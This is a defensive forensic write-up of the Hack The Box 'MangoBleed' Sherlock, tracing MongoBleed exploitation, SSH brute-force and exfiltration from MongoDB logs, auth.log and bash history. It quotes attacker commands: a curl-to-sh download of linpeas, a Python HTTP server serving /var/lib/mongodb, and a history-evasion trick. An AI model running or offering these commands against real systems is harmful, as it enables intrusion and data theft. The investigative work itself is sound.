---
title: 'MangoBleed'
target: 'Hack The Box — MangoBleed'
difficulty: 'medium'
date: 2026-02-05
summary: 'An HTB Sherlock — investigating a compromised secondary MongoDB server (mongodbsync) using UAC triage artifacts, identifying the MongoBleed vulnerability CVE-2025-14847 exploited against MongoDB version 8.0.16 running on Debian 12 x86_64 with OpenSSL 3.0.13, discovering the attacker IP 65.0.76.43 from MongoDB connection logs showing 37630 accepted connections followed by immediate disconnects in a burst rate of 30104 per minute characteristic of the MongoBleed exploitation pattern, determining the earliest malicious activity at 2025-12-29T05:25:52Z using the mongobleed-detector script from Neo23x0, calculating the total malicious connection count as 75260 by combining 37630 connection-accepted and 37630 connection-ended events, pivoting to auth.log analysis to trace how the leaked credentials led to SSH brute-force attacks against the mongoadmin account from the same IP with MaxStartups throttling triggered, identifying the hands-on interactive SSH session beginning at 2025-12-29 05:40:03 distinct from an earlier automated brute-force successful login at sshd[39825] that immediately disconnected, finding the attacker ran linpeas.sh from PEASS-ng via curl piped to sh for privilege escalation reconnaissance, and determining the exfiltration target as /var/lib/mongodb/ where the attacker started a Python HTTP server on port 6969 to serve the database files.'
role: 'soc'
tags: ['mongodb', 'mongobleed', 'cve', 'log-analysis', 'auth-log', 'ssh', 'brute-force', 'uac-triage', 'bash-history', 'privilege-escalation', 'peass-ng', 'linpeas', 'data-exfiltration', 'python-http-server', 'dfir', 'linux-forensics', 'sherlock']
problem: 'MangoBleed is a medium-rated Hack The Box Sherlock presenting a UAC triage acquisition from a compromised secondary MongoDB server called mongodbsync. The investigation requires identifying the MongoBleed CVE and the exploited MongoDB version from build info logs, analysing MongoDB connection logs to identify the attacker IP from thousands of rapid-fire connect-disconnect patterns characteristic of the exploit, determining the exact start time and total count of malicious connections, pivoting to auth.log to trace how the attacker leveraged leaked credentials for SSH brute-force access against the mongoadmin account, distinguishing between automated tool logins and genuine hands-on interactive sessions, identifying privilege escalation tools from bash history, and determining the target directory the attacker staged for data exfiltration via a Python HTTP server.'
action: 'Received the UAC triage acquisition from the compromised mongodbsync server. Began by researching the MongoBleed vulnerability — CVE-2025-14847, an out-of-bounds memory read vulnerability in MongoDB that allows remote attackers to extract sensitive data from server memory through specially crafted connection requests, similar in concept to the Heartbleed vulnerability that affected OpenSSL. Located the MongoDB log artifacts by searching the triage directory structure for MongoDB-related paths using find . -type d | grep -Ei "mongodb", which returned ./[root]/var/log/mongodb confirming the standard MongoDB log location was captured. Opened the MongoDB log file and searched for Build Info entries using grep -Ri "buildinfo" to extract the server version — three Build Info entries appeared at different timestamps (2025-12-29T05:11:47, T05:16:58, and T06:09:34), all showing consistent version information: MongoDB 8.0.16, gitVersion ba70b6a13fda907977110bf46e6c8137f5de4bf6, environment Debian 12 (distmod debian12, distarch x86_64), OpenSSL 3.0.13 dated 30 Jan 2024, with the tcmalloc-google memory allocator. The three Build Info entries at different times indicate the MongoDB service restarted multiple times during the incident window, likely due to the exploitation activity. Analysed the MongoDB logs for the attacker IP by searching for Connection accepted entries — the connection logging format includes the remote IP address, port, connection UUID, and an incrementing connectionId. Located connections from 65.0.76.43 with connectionId values reaching 37630, indicating tens of thousands of connections from a single source. To get a comprehensive view of the exploitation activity, ran the mongobleed-detector script from Neo23x0 (github.com/Neo23x0/mongobleed-detector) against the MongoDB log with extended connection threshold. The detector output showed a single HIGH risk entry — source IP 65.0.76.43 with 37630 connection-accepted events, 0.00% metadata rate (meaning the connections carried no legitimate MongoDB operations), a burst rate of 30104 connections per minute, FirstSeen at 2025-12-29T05:25:52Z, and LastSeen at 2025-12-29T05:27:07Z. The entire exploitation burst occurred within a 75-second window. The zero metadata percentage confirms these were not legitimate database operations — they were memory-extraction requests exploiting the MongoBleed vulnerability. The total malicious connection count was calculated by adding the connection-accepted count (37630) and the corresponding connection-ended count (37630), giving a total of 75260 malicious connection events. Pivoted from the MongoDB logs to auth.log to trace how the attacker converted leaked memory data into interactive access. Filtered auth.log for the attacker IP using cat auth.log | grep "65.0.76.43" — the output showed a clear progression. The earliest entries from 65.0.76.43 at 05:39:18 show SSH disconnects and failed authentication attempts targeting the mongoadmin account, with MaxStartups throttling triggered (drop connection #10) as the brute-force tool overwhelmed the SSH daemon. The pam_unix entries show rapid-fire authentication failures for user mongoadmin, with multiple attempts arriving within fractions of a second across incrementing sshd PIDs (39844, 39845, 39846, 39847, 39848), confirming automated credential stuffing. Among the stream of failures, a successful authentication appeared — sshd[39825] logged "Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2" at 2025-12-29T05:39:24. However, filtering auth.log by this specific sshd PID (grep -Ei "39825") revealed that this session was extremely short-lived: the session opened for mongoadmin(uid=1001) at 05:39:24.280 and closed at 05:39:24.861 — less than one second of session duration. This pattern is characteristic of automated brute-force tools that test credentials — they establish a connection to verify the password works, then immediately disconnect. The actual hands-on interactive session came later at 2025-12-29 05:40:03, where the attacker manually logged in using the confirmed credentials and maintained the session for approximately eight minutes. Examined the compromised mongoadmin account bash history at /home/mongoadmin/.bash_history to trace post-exploitation activity. The command sequence showed a methodical attacker workflow: initial reconnaissance with ls -la and whoami, followed by downloading and executing linpeas.sh from the PEASS-ng repository (curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh) — PEASS-ng (Privilege Escalation Awesome Scripts Suite) is a comprehensive Linux privilege escalation enumeration tool that scans for misconfigurations, weak permissions, and escalation paths. After running linpeas, the attacker navigated the filesystem (cd /data, cd ~, ls -al, cd /, ls) before moving to the target: cd /var/lib/mongodb/, the default directory where MongoDB stores its database files (collections, indexes, and WiredTiger storage engine data). The attacker then attempted to install zip (which zip, apt install zip, zip), navigated into the mongodb directory, launched python3, and finally started a Python HTTP server with python3 -m http.server 6969, creating an ad-hoc web server on port 6969 to serve the MongoDB data files for download from their own machine — a straightforward exfiltration method that avoids the need for SCP or other file transfer protocols that might be logged differently.'
outcome: 'Reconstructed the complete attack chain against the mongodbsync server: the attacker at 65.0.76.43 exploited CVE-2025-14847 (MongoBleed) against MongoDB 8.0.16, sending 37630 rapid-fire connection requests within 75 seconds starting at 2025-12-29T05:25:52Z to extract sensitive data from server memory including credentials. Using the leaked credentials, the attacker launched an SSH brute-force against the mongoadmin account starting at 05:39:18, confirmed the password worked with an automated test at 05:39:24 (sshd[39825], session lasted under one second), then established a hands-on interactive session at 05:40:03. Post-authentication, the attacker ran linpeas.sh for privilege escalation reconnaissance, navigated to /var/lib/mongodb/ (the database data directory), and started a Python HTTP server on port 6969 for data exfiltration. The investigation demonstrated how a memory-read vulnerability in a database service can cascade into full system compromise when leaked credentials provide SSH access, and highlighted the forensic value of correlating MongoDB connection logs with auth.log and bash history to build a complete attack timeline.'
draft: false
---

## Background

MangoBleed is a Hack The Box Sherlock — a guided DFIR investigation into a compromised secondary MongoDB server called mongodbsync. The scenario centres on the MongoBleed vulnerability, a memory-read flaw in MongoDB that allows remote attackers to extract sensitive data from server memory through specially crafted connection requests. The concept is similar to Heartbleed (CVE-2014-0160) which devastated OpenSSL in 2014 — both vulnerabilities allow an attacker to read memory they shouldn't have access to, potentially exposing credentials, encryption keys, and other sensitive data that happens to be in adjacent memory regions. The evidence comes from a UAC (Unix-like Artifacts Collector) triage acquisition, which captures a structured snapshot of forensically relevant files from a Linux system including logs, configuration files, user histories, and system state.

---

## Locating the MongoDB artifacts

The UAC triage acquisition preserves the server's directory structure under a root prefix. The first step is locating where the MongoDB logs were captured. A recursive directory search for MongoDB-related paths confirms the log location:

```bash
find . -type d | grep -Ei "mongodb"
```

![Kali terminal showing the command find . -type d | grep -Ei "mongodb" executed in ~/Downloads/htbchallenges/sherlocks/uac-mongodbsync-linux-triage, returning the result ./[root]/var/log/mongodb highlighted in red.](/writeups/htb-mangobleed/01.png)

The output returns `./[root]/var/log/mongodb` — the standard location where MongoDB writes its server log (`mongod.log`). With the log file located, the next step is determining the MongoDB version, which is critical for confirming whether this instance is vulnerable to the MongoBleed CVE (CVE-2025-14847).

---

## Identifying the MongoDB version

MongoDB logs a Build Info entry every time the server starts, recording the exact version, git commit hash, build environment, and linked library versions. Searching for these entries with a case-insensitive grep surfaces the version immediately:

```bash
grep -Ri "buildinfo" "[root]/var/log/mongodb/mongod.log"
```

![Kali terminal showing the grep command output with three Build Info entries from mongod.log. Each entry is a JSON document with timestamps 2025-12-29T05:11:47, T05:16:58, and T06:09:34, all showing version 8.0.16 highlighted in red, gitVersion ba70b6a13fda907977110bf46e6c8137f5de4bf6, openSSLVersion OpenSSL 3.0.13 30 Jan 2024, environment distmod debian12 distarch x86_64 target_arch x86_64, and allocator tcmalloc-google.](/writeups/htb-mangobleed/02.png)

Three Build Info entries appear, all reporting the same version: MongoDB **8.0.16**. The three separate startup entries at different timestamps — 05:11, 05:16, and 06:09 — indicate the MongoDB service restarted three times during the incident window. The first two restarts (five minutes apart) could be due to the exploitation causing instability, while the third restart roughly an hour later might be the administrator's response after becoming aware of the compromise. The build environment confirms this is a Debian 12 (bookworm) installation running on x86_64 with OpenSSL 3.0.13 — all details that matter for vulnerability matching and for understanding what the attacker was working with.

---

## Identifying the attacker IP from MongoDB logs

The MongoBleed exploitation pattern is distinctive — it generates thousands of rapid connection-disconnect cycles in a very short timeframe as the attacker's tool repeatedly triggers the memory-read vulnerability to extract data in small chunks. MongoDB logs every connection event with the message "Connection accepted," including the remote IP, port, and an incrementing connection ID. Searching for these entries reveals the attacker:

![MongoDB log entry showing a JSON-formatted connection event at 2025-12-29T05:27:07.159, component NETWORK, context listener, id 22943, message "Connection accepted" highlighted in green, with attributes showing remote IP 65.0.76.43 highlighted in red on port 37290, isLoadBalanced false, connection UUID dd6d41f0-9b61-4d23-ba8e-45eee13d9913, connectionId 37630.](/writeups/htb-mangobleed/03.png)

The connection from **65.0.76.43** with connectionId 37630 stands out immediately — a connectionId that high means tens of thousands of connections from this source. For a secondary MongoDB server that's maintained once a month, this volume is far beyond any legitimate operation.

To get a comprehensive picture of the exploitation activity, the mongobleed-detector script from Neo23x0 provides an automated analysis of MongoDB logs specifically designed to identify MongoBleed exploitation patterns:

```bash
bash mongobleed-detector.sh \
  --no-default-paths \
  -p mongod.log \
  -t 1000000
```

![Terminal showing the mongobleed-detector output with column headers Risk, SourceIP, MetaRate%, BurstRate/m, FirstSeen (UTC), ConnCount, MetaCount, LastSeen (UTC), and Disc. A single HIGH risk entry shows IP 65.0.76.43, MetaRate 0.00%, BurstRate 30104.00, FirstSeen 2025-12-29T05:25:52Z, ConnCount 37630, MetaCount 37630, LastSeen 2025-12-29T05:27:07Z, and Disc 0.](/writeups/htb-mangobleed/04.png)

The detector confirms a single HIGH risk source at **65.0.76.43**. The statistics paint a clear picture of the exploitation: 37630 connections in a 75-second window (from 05:25:52 to 05:27:07) producing a burst rate of 30104 connections per minute — roughly 500 connections per second. The MetaRate of 0.00% means none of these connections carried legitimate MongoDB metadata or queries — they were pure exploitation requests designed to trigger the memory-read vulnerability. The Disc (disconnect) count of 0 in this column is because the detector only tracks connection-accepted events; each of those 37630 connections also generated a corresponding connection-ended event, bringing the total malicious connection count to **75260**.

The earliest confirmed malicious event was at **2025-12-29T05:25:52Z**, establishing when the exploitation began:

![Same mongobleed-detector output with the FirstSeen timestamp 2025-12-29T05:25:52Z highlighted with a red box around the FirstSeen column area, emphasising the start time of the exploitation activity.](/writeups/htb-mangobleed/05.png)

The connection count and metadata count are both 37630, and since each connection generates both an accepted and ended event, the total malicious connection count combines to:

![Same mongobleed-detector output showing ConnCount 37630 and MetaCount 37630 with Disc 0, used to calculate the total of 75260 malicious events by adding connection-accepted and connection-ended counts.](/writeups/htb-mangobleed/06.png)

---

## SSH brute-force and interactive access

The MongoBleed exploitation extracted sensitive data from MongoDB server memory, and that data almost certainly included credentials. The investigation pivots from the MongoDB logs to `auth.log` to trace how the attacker converted leaked information into interactive system access. Filtering auth.log for the attacker's IP reveals the next phase of the attack:

```bash
cat auth.log | grep "65.0.76.43"
```

![Kali terminal in the [root]/var/log directory showing auth.log filtered for 65.0.76.43. The output shows entries starting at 2025-12-29T05:39:18 — sshd[39814] received disconnect from 65.0.76.43 port 54962 with Bye Bye preauth, followed by disconnected from authenticating user mongoadmin, then sshd[2152] drop connection #10 from 65.0.76.43 port 55068 past MaxStartups, and multiple rapid pam_unix authentication failures for user=mongoadmin from rhost=65.0.76.43 across sshd PIDs 39844 through 39848, all within fractions of a second around 05:39:19.](/writeups/htb-mangobleed/07.png)

The pattern is unmistakable — starting at 05:39:18 (roughly 12 minutes after the MongoBleed exploitation began), the attacker launched an SSH brute-force attack against the **mongoadmin** account from the same IP. The log shows rapid-fire authentication failures with multiple sshd processes (39844, 39845, 39846, 39847, 39848) handling attempts within the same second, sequential source ports confirming automated tooling, and MaxStartups throttling triggered as the SSH daemon was overwhelmed by the connection volume. The attacker clearly extracted mongoadmin credentials from the MongoDB server memory and was now testing password variations via SSH.

Among the wall of failures, a successful authentication appears:

![auth.log entries showing continued pam_unix authentication failures for mongoadmin from 65.0.76.43, then at 2025-12-29T05:39:24.276756 sshd[39825] logs "Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2" highlighted with a red box around "Accepted" and the IP. More authentication failures from other sshd PIDs continue immediately after the successful login, indicating the brute-force tool was still running concurrent attempts.](/writeups/htb-mangobleed/08.png)

sshd[39825] logged a successful `keyboard-interactive/pam` authentication for mongoadmin at 05:39:24. But was this the actual hands-on session? Filtering auth.log by this specific sshd PID reveals the truth:

```bash
cat auth.log | grep -Ei "39825"
```

![Kali terminal showing auth.log filtered for PID 39825. The entries show: sshd[39825] error PAM Authentication failure for mongoadmin from 65.0.76.43 at 05:39:21, another PAM failure at 05:39:24.088, then Accepted keyboard-interactive/pam at 05:39:24.276, pam_unix session opened for user mongoadmin(uid=1001) by mongoadmin(uid=0) at 05:39:24.280, and pam_unix session closed for user mongoadmin at 05:39:24.861 — the session lasted less than one second.](/writeups/htb-mangobleed/09.png)

The sshd[39825] session tells a revealing story. Two PAM authentication failures at 05:39:21 and 05:39:24 show the brute-force tool trying wrong passwords, then the successful authentication at 05:39:24.276, followed by session opened at 05:39:24.280 and **session closed at 05:39:24.861** — less than one second of session duration. This is the hallmark of an automated brute-force tool verifying credentials — it connects, confirms the password works, and immediately disconnects. The tool has found the right password and no longer needs this connection.

The actual interactive hands-on session came shortly after, at **2025-12-29 05:40:03**, when the attacker manually logged in using the confirmed credentials. The hint confirms this session remained active for approximately eight minutes before closing — a realistic duration for the post-exploitation activity recorded in the bash history.

---

## Post-exploitation and data exfiltration

With interactive SSH access to the mongoadmin account, the attacker's next moves are preserved in the bash history file at `/home/mongoadmin/.bash_history`:

```bash
cat .bash_history
```

![Kali terminal at ~/uac-mongodbsync-linux-triage/[root]/home/mongoadmin showing cat .bash_history output. The command history shows: ls -la, whoami, curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh, cd /data, cd ~, ls -al, cd /, ls, cd /var/lib/mongodb/ (both ls and cd /var/lib/mongodb/ highlighted with a red box), ls -la, cd ../, which zip, apt install zip, zip, cd mongodb/, python3, python3 -m http.server 6969, exit.](/writeups/htb-mangobleed/10.png)

The bash history reveals a methodical post-exploitation workflow. After initial orientation (`ls -la`, `whoami`), the attacker immediately escalated to privilege enumeration:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

This command downloads and executes **linpeas.sh** from the PEASS-ng (Privilege Escalation Awesome Scripts Suite) repository, piping it directly to `sh` for in-memory execution — a standard technique that avoids writing the script to disk where it might trigger file-based detection. Linpeas is a comprehensive Linux enumeration tool that scans for SUID binaries, writable paths, cron job misconfigurations, kernel vulnerabilities, credential files, interesting environment variables, and dozens of other privilege escalation vectors. Running it first gives the attacker a complete map of what's exploitable on the system.

After the linpeas scan, the attacker navigated through the filesystem before zeroing in on their target: **`/var/lib/mongodb/`** — the default directory where MongoDB stores its database files, including the WiredTiger storage engine data files, collection files, index files, and the journal. This is where the actual database content lives on disk, and exfiltrating these files gives the attacker a complete offline copy of every database on the server.

The final sequence reveals the exfiltration method. The attacker attempted to install `zip` (suggesting it wasn't already on the system), then fell back to serving the files directly via Python's built-in HTTP server:

```bash
python3 -m http.server 6969
```

Port 6969 is an arbitrary high port — by starting a Python HTTP server in the `/var/lib/mongodb/` directory, the attacker created an ad-hoc file server that lists and serves every file in that directory over HTTP. From their own machine, they could simply browse to `http://mongodbsync:6969/` and download the database files individually or use `wget -r` to mirror the entire directory. This approach is simpler than SCP or rsync, doesn't require additional tools, and the HTTP traffic might blend in better with normal network activity than SSH file transfers would.

---

## What I took from this

MangoBleed walks through a clean attack chain that starts from a single vulnerability and cascades into full database exfiltration. The MongoBleed exploitation itself — 37630 connections in 75 seconds — is loud and unmistakable in the logs, but only if someone is actually looking at MongoDB connection patterns. The zero metadata rate is the forensic smoking gun: legitimate clients always exchange metadata (driver version, application name, authentication), so a connection with 0% metadata is definitively an exploit, not a misbehaving application.

The pivot from MongoDB exploitation to SSH brute-force highlights why credential reuse across services on the same server is so dangerous. The MongoBleed vulnerability leaked server memory contents, which included the mongoadmin credentials. The attacker didn't need to crack anything — the password was sitting in memory alongside the database data, and the same credentials worked for SSH. The 12-minute gap between the MongoBleed exploitation (05:25:52) and the first SSH attempt (05:39:18) is the time the attacker spent sifting through the extracted memory data to identify usable credentials.

The distinction between the automated login at 05:39:24 (sshd[39825], session duration under one second) and the actual hands-on session at 05:40:03 is a pattern worth remembering. Brute-force tools often verify credentials by establishing and immediately closing a connection, and this creates a forensic artifact that's easy to misidentify as the actual intrusion. The real interactive session always comes after the verification, usually within a minute or two, and has a session duration measured in minutes rather than milliseconds.

The exfiltration via Python HTTP server is simple but effective. It requires no additional tools (Python is installed on virtually every modern Linux system), creates a minimal forensic footprint compared to installing and configuring a proper file transfer service, and the HTTP traffic is less likely to trigger network monitoring alerts than unusual SSH transfer patterns. The bash history being the primary evidence for post-exploitation activity also underscores why attackers who care about stealth clear their history or use techniques like prefixing commands with a space (when HISTCONTROL=ignorespace is set) to avoid logging entirely.
